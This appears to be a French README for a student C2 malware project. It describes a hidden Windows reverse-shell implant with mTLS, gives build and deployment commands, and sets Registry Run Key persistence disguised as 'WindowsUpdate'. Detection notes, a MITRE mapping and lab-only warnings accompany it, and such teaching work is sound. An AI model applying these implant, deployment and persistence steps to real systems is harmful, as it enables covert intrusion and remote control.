# s0P0wn3d — Offensive C2 Framework

> **Projet pédagogique EPITECH — VIROLOGY**
> Usage strictement limité aux environnements de lab autorisés.
> Toute utilisation sur un système sans consentement écrit est illégale.
 
---

## Table des matières

- [Statut du projet](#statut-du-projet)
- [Architecture](#architecture)
- [Lab Environment](#lab-environment)
- [Installation](#installation)
- [Utilisation](#utilisation)
- [Chiffrement](#chiffrement)
- [Persistance](#persistance)
- [MITRE ATT\&CK](#mitre-attck)
- [Known Weaknesses](#known-weaknesses)
- [Sources & Références](#sources--références)
---

## Statut du projet

| Phase | Fonctionnalité | Status |
|-------|---------------|--------|
| 1 | Reverse shell (cmd.exe via pipe anonyme) | ✅ Fonctionnel |
| 1 | C2 server Python | ✅ Remplacé par C |
| 2 | Chiffrement mTLS TLSv1.3 (OpenSSL) | ✅ Fonctionnel |
| 2 | Authentification mutuelle (certificats X.509) | ✅ Fonctionnel |
| 2 | Preuve de chiffrement (tcpdump/Wireshark) | ✅ Validé |
| 2 | C2 server en C (remplacement Python) | ✅ Fonctionnel |
| 2 | Persistance (Registry Run Key T1547.001) | ✅ Fonctionnel |
| 3 | AV evasion (obfuscation strings) | 📋 Planifié |
| 3 | Log rollback | 📋 Planifié |
| 3 | Payloads avancés (loot, privesc, keylog) | 📋 Planifié |
 
---

## Architecture

```
Implant (Windows 10 — 192.168.56.101)
    │
    │  TLSv1.3 :4444
    │
    │  mTLS — Authentification mutuelle X.509 :
    │    Implant  → présente client.crt (signé par CA)
    │    C2 Server → présente server.crt (signé par CA, SAN=IP:192.168.56.104)
    │    Les deux valident le certificat de l'autre via ca.crt
    │
    │  Données (commandes / réponses) :
    │    Chiffrées TLSv1.3 (AES-256-GCM ou ChaCha20-Poly1305 selon négociation)
    │
    ▼
C2 Server en C (Ubuntu 24.04 — 192.168.56.104)
    │
    ▼
Attaquant (shell interactif [C2]>)
```

### Flux détaillé

1. L'implant `.exe` s'exécute sur Windows (sans fenêtre, `-mwindows`)
2. Il se connecte en TCP vers le C2 (retry toutes les 5s si indisponible)
3. **Handshake TLS 1.3** : négociation automatique — l'implant présente `client.crt`, le C2 présente `server.crt`, les deux vérifient via `ca.crt`
4. Toutes les communications sont chiffrées TLSv1.3 par OpenSSL
5. Les commandes sont exécutées via `cmd.exe` avec un pipe anonyme (pas de fichier temporaire, pas de console visible)
6. L'implant ajoute `\x00END` en fin de sortie pour signaler la fin de la réponse
---

## Lab Environment

| Machine | OS | IP | Rôle |
|---------|----|----|------|
| C2 Server | Ubuntu 24.04 LTS | 192.168.56.104 | Attaquant |
| Target | Windows 10 21H2 Eval | 192.168.56.101 | Victime |

**Réseau :** VirtualBox Host-Only `192.168.56.0/24`
- Les deux VMs se voient entre elles
- Isolées d'Internet (sauf `enp0s3` NAT sur Ubuntu pour `apt`)
  **Ubuntu — 2 adaptateurs réseau :**
- `enp0s3` → NAT (internet)
- `enp0s8` → Host-Only `192.168.56.104` (communication avec Windows)
---

## Installation

### Prérequis C2 Ubuntu (une seule fois)

```bash
sudo apt install gcc libssl-dev openssl -y
```

### Compiler le C2 server (Ubuntu)

```bash
cd src/controller/server
make server
# Produit : c2_server (binaire Linux)
```

### Générer les certificats mTLS

```bash
cd src/controller/server
make certs C2_IP=192.168.56.104
# Produit : certs/ca.crt, server.crt/key, client.crt/key
```

### Configurer le C2

```bash
cd src/controller/server
cp .env.example .env
# Vérifier que SERVER_IP=192.168.56.104 dans .env
```

### Compiler l'implant (Windows natif — MSYS2 MINGW64)

> L'implant se compile **nativement sur Windows** avec MSYS2 MINGW64.
> La cross-compilation Linux → Windows n'est plus supportée.

1. Télécharger et installer [MSYS2](https://www.msys2.org/)
2. Ouvrir le terminal **MSYS2 MINGW64** (pas MSYS2, pas UCRT64)
3. Installer les dépendances (une seule fois) :
```bash
pacman -S mingw-w64-x86_64-gcc mingw-w64-x86_64-openssl
```

4. Compiler l'implant :
```bash
cd /c/chemin/vers/s0P0wn3d/src/controller/server
 
gcc -Wall -Wextra -O2 \
    -DC2_IP=\"192.168.56.104\" -DC2_PORT=4444 \
    -o implant.exe implant.c tls.c \
    -lssl -lcrypto -lws2_32 -lgdi32 -lcrypt32 -static -s -mwindows
```

> **Debug** (affiche les erreurs TLS dans une console) : retirer `-mwindows`

### Déployer l'implant sur la VM Windows

```bash
# Depuis Ubuntu : serveur HTTP temporaire
cd src/controller/server
python3 -m http.server 8080
```

```powershell
# Depuis la VM Windows (PowerShell)
Invoke-WebRequest -Uri http://192.168.56.104:8080/implant.exe -OutFile C:\c2\implant.exe
Invoke-WebRequest -Uri http://192.168.56.104:8080/certs/ca.crt -OutFile C:\c2\certs\ca.crt
Invoke-WebRequest -Uri http://192.168.56.104:8080/certs/client.crt -OutFile C:\c2\certs\client.crt
Invoke-WebRequest -Uri http://192.168.56.104:8080/certs/client.key -OutFile C:\c2\certs\client.key
```

Créer `.env` dans `C:\c2\` :
```
SERVER_IP=192.168.56.104
SERVER_PORT=4444
CA_CERT=certs/ca.crt
CLIENT_CERT=certs/client.crt
CLIENT_KEY=certs/client.key
```
 
---

## Utilisation

### Lancer le C2 Server (Ubuntu)

```bash
cd src/controller/server
./c2_server
```

### Exécuter l'implant sur Windows

Double-clic sur `implant.exe` — aucune fenêtre n'apparaît. L'implant se reconnecte automatiquement toutes les 5s si le C2 n'est pas disponible.

### Shell interactif

```
[TLS] Écoute sur 0.0.0.0:4444
[+] Implant connecté (TLSv1.3)
[C2]> whoami
desktop-99de0lj\target
[C2]> ipconfig
[...]
[C2]> exit
```
 
---

## Chiffrement

### mTLS TLSv1.3 (OpenSSL)

Le canal C2 utilise **mutual TLS** — les deux parties s'authentifient :

- **CA** (`ca.crt`) : autorité de certification auto-signée. Seuls les certificats signés par cette CA sont acceptés.
- **Serveur** (`server.crt`) : certificat du C2, avec SAN `IP:192.168.56.104`. L'implant vérifie que le C2 est bien le bon serveur.
- **Client** (`client.crt`) : certificat de l'implant. Le C2 refuse toute connexion sans certificat client valide.
  Le chiffrement du trafic est assuré par TLSv1.3 (négociation automatique AES-256-GCM ou ChaCha20-Poly1305).

### Génération des certificats

```bash
make certs C2_IP=192.168.56.104
# ou directement :
bash gen-certs.sh 192.168.56.104
```

### Preuve par capture réseau

```bash
# Capturer le trafic
sudo tcpdump -i enp0s8 -w ~/traffic_mtls.pcap port 4444
 
# Vérifier l'absence de texte clair
strings ~/traffic_mtls.pcap | grep -iE "(whoami|target|windows|cmd)"
# Résultat attendu : aucune correspondance
```
 
---

## Persistance

### Mécanisme — Registry Run Key (T1547.001)

L'implant s'installe dans la clé de registre **HKCU Run** au premier lancement :

```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    "WindowsUpdate" = "C:\c2\implant.exe"
```

- **Portée** : utilisateur courant (`HKCU`) — pas besoin de droits admin
- **Déclencheur** : à chaque ouverture de session Windows
- **Clé utilisée** : `WindowsUpdate` (nom générique pour passer inaperçu)
### Détection (Blue Team)

| Indicateur | Description |
|-----------|-------------|
| Event ID 4657 | Modification de clé de registre |
| Sysmon Event ID 13 | `SetValue` sur `HKCU\...\Run` |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Inspection manuelle |
| Autoruns (Sysinternals) | Liste toutes les entrées de persistance |
 
---

## MITRE ATT&CK

### Capacités implémentées

| Capacité | Tactic | Technique | ID | Blue Team Note |
|----------|--------|-----------|-----|----------------|
| **Reverse shell** | Execution | Windows Command Shell | T1059.003 | Surveiller les processus `cmd.exe` spawné par un process non-interactif. Event ID 4688 + Sysmon Event ID 1. |
| **Canal C2 mTLS** | Command and Control | Encrypted Channel — Symmetric Cryptography | T1573.001 | Connexion TLSv1.3 sortante persistante vers port 4444. Règle réseau : bloquer les connexions sortantes non whitelistées. Certificats clients comme IOC. |
| **Pipe anonyme (exec)** | Defense Evasion | Process Injection / Masquerading | T1055 | `cmd.exe` spawné sans console (`CREATE_NO_WINDOW`). Sysmon Event ID 1 : détecter `cmd.exe` avec `ParentImage` non-standard. |
| **Persistance Registry Run Key** | Persistence | Registry Run Keys / Startup Folder | T1547.001 | Surveiller `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`. Event ID 4657 ou Sysmon Event ID 13. Comparer la baseline du registre au démarrage. |

### Capacités planifiées

| Capacité | Tactic | Technique | ID | Blue Team Note |
|----------|--------|-----------|-----|----------------|
| **Keylogger** | Collection | Keylogging | T1056.001 | Hook clavier via `SetWindowsHookEx(WH_KEYBOARD_LL)`. Sysmon Event ID 10. Antivirus comportemental. |
| **Loot (exfiltration)** | Collection / Exfiltration | Data from Local System | T1005 | Surveiller les accès aux fichiers sensibles (`SAM`, `.ssh/`). Event ID 4663. |
| **Privesc** | Privilege Escalation | Exploitation for Privilege Escalation | T1068 | Auditer les misconfigurations locales. Event ID 4672. |
| **AV evasion** | Defense Evasion | Obfuscated Files or Information | T1027 | XOR string obfuscation, packer. |
 
---

## Known Weaknesses

| Faiblesse | Détectabilité | Statut |
|-----------|--------------|--------|
| IP C2 hardcodée à la compilation | Reverse engineering (`strings implant.exe`) | Phase 3 : chiffrement des strings |
| `cmd.exe` visible dans la liste des process | Task Manager / Sysmon | Phase 3 : built-in shell sans spawner cmd.exe |
| Clé de registre avec nom générique | Autoruns / Sysmon Event ID 13 | Accepté — amélioration possible (nom aléatoire) |
| Certificats clients comme IOC | Extraction depuis binaire ou réseau | Phase 3 : rotation de certificats |
| Pas d'obfuscation du binaire | Signatures AV statiques | Phase 3 : XOR string obfuscation, packer |
 
---

## Sources & Références

### Cryptographie & TLS
- [RFC 8446 — TLS 1.3](https://datatracker.ietf.org/doc/html/rfc8446)
- [OpenSSL Documentation](https://docs.openssl.org/)
- [mTLS — mutual TLS explained](https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/)
### C2 / Architecture (référence architecturale uniquement)
- [Sliver C2](https://github.com/BishopFox/sliver) — implant-to-controller pattern
- [Havoc C2](https://github.com/HavocFramework/Havoc) — architecture de référence
### MITRE ATT&CK
- [T1059.003 — Windows Command Shell](https://attack.mitre.org/techniques/T1059/003/)
- [T1573.001 — Symmetric Cryptography](https://attack.mitre.org/techniques/T1573/001/)
- [T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)
- [T1547.001 — Registry Run Keys](https://attack.mitre.org/techniques/T1547/001/)
### Windows Internals
- [CreateProcess + anonymous pipes](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [RegSetValueEx — Registry API](https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)
- [MSYS2](https://www.msys2.org/) — toolchain Windows native
---

> ⚠️ Ce projet est réalisé dans un cadre pédagogique strict (EPITECH VIROLOGY).
> Ne jamais utiliser hors d'un environnement de lab déclaré et avec consentement écrit.
> **THIS IS NO JOKE.**
